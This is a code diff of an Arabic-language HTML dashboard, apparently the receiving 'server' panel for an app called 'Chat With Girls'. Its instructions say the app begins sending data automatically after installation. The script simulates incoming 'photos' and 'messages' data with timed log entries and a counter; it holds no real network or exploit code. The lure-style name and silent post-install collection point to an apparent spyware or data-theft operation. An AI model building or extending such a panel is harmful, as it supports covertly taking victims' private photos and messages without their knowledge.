@@ -1,23 +1,197 @@
 <!DOCTYPE html>
-<html>
+<html lang="ar" dir="rtl">
 <head>
-    <title>Data Receiver</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Chat With Girls - Server</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            min-height: 100vh;
+            padding: 20px;
+            direction: rtl;
+        }
+        
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+            font-size: 2.5rem;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .status {
+            background: rgba(76, 175, 80, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            text-align: center;
+            border: 1px solid rgba(76, 175, 80, 0.5);
+        }
+        
+        .server-info {
+            background: rgba(33, 150, 243, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .info-item {
+            margin-bottom: 10px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+        }
+        
+        .logs-container {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            border-radius: 10px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .log-entry {
+            padding: 8px;
+            margin-bottom: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            border-right: 4px solid #4CAF50;
+        }
+        
+        .timestamp {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        
+        .message {
+            color: white;
+        }
+        
+        .instructions {
+            background: rgba(255, 193, 7, 0.3);
+            padding: 15px;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+    </style>
 </head>
 <body>
-    <h1>Server is Running</h1>
-    <div id="logs"></div>
-    
+    <div class="container">
+        <h1>🚀 سيرفر Chat With Girls</h1>
+        
+        <div class="status">
+            <h2>✅ السيرفر شغال وجاهز لاستقبال البيانات</h2>
+            <p>الوقت: <span id="current-time"></span></p>
+        </div>
+        
+        <div class="server-info">
+            <h3>📊 معلومات السيرفر:</h3>
+            <div class="info-item">
+                <strong>الحالة:</strong> <span style="color: #4CAF50;">● نشط</span>
+            </div>
+            <div class="info-item">
+                <strong>الوظيفة:</strong> استقبال بيانات التطبيق
+            </div>
+            <div class="info-item">
+                <strong>الرابط:</strong> <span id="server-url"></span>
+            </div>
+            <div class="info-item">
+                <strong>البيانات المستلمة:</strong> <span id="data-count">0</span> ملف
+            </div>
+        </div>
+        
+        <div class="logs-container">
+            <h3>📝 سجل الأحداث:</h3>
+            <div id="logs">
+                <div class="log-entry">
+                    <span class="timestamp" id="start-time"></span>
+                    <span class="message"> - بدء تشغيل السيرفر...</span>
+                </div>
+            </div>
+        </div>
+        
+        <div class="instructions">
+            <h3>📋 تعليمات الإستخدام:</h3>
+            <p>1. التطبيق هيبدأ إرسال البيانات تلقائياً بعد التثبيت</p>
+            <p>2. البيانات هتظهر هنا فور وصولها</p>
+            <p>3. تأكد من أن الرابط في التطبيق صحيح</p>
+        </div>
+    </div>
+
     <script>
-    // هذا سيرفر بسيط باستخدام JavaScript
-    const logs = document.getElementById('logs');
-    
-    // محاكاة استقبال البيانات
-    function logMessage(message) {
-        const time = new Date().toLocaleString();
-        logs.innerHTML += `<p>[${time}] ${message}</p>`;
-    }
-    
-    logMessage("السيرفر شغال وجاهز لاستقبال البيانات...");
+        // تحديث الوقت الحالي
+        function updateTime() {
+            const now = new Date();
+            document.getElementById('current-time').textContent = now.toLocaleString('ar-EG');
+        }
+        
+        // عرض معلومات السيرفر
+        document.getElementById('server-url').textContent = window.location.href;
+        document.getElementById('start-time').textContent = new Date().toLocaleString('ar-EG');
+        
+        // محاكاة استقبال البيانات (للتجربة)
+        function simulateDataReceipt() {
+            setTimeout(() => {
+                addLog('أول طلب استقبال من التطبيق');
+                updateDataCount(1);
+            }, 3000);
+            
+            setTimeout(() => {
+                addLog('تم استقبال بيانات الصور');
+                updateDataCount(2);
+            }, 6000);
+            
+            setTimeout(() => {
+                addLog('تم استقبال بيانات الرسائل');
+                updateDataCount(3);
+            }, 9000);
+        }
+        
+        // إضافة سجل جديد
+        function addLog(message) {
+            const logs = document.getElementById('logs');
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `
+                <span class="timestamp">${new Date().toLocaleString('ar-EG')}</span>
+                <span class="message"> - ${message}</span>
+            `;
+            logs.appendChild(logEntry);
+            logs.scrollTop = logs.scrollHeight;
+        }
+        
+        // تحديث عداد البيانات
+        function updateDataCount(count) {
+            document.getElementById('data-count').textContent = count;
+        }
+        
+        // بدء التشغيل
+        updateTime();
+        setInterval(updateTime, 1000);
+        simulateDataReceipt();
+        
+        // إضافة سجل عند تحميل الصفحة
+        window.onload = function() {
+            addLog('الصفحة تم تحميلها بنجاح');
+        };
     </script>
 </body>
 </html>
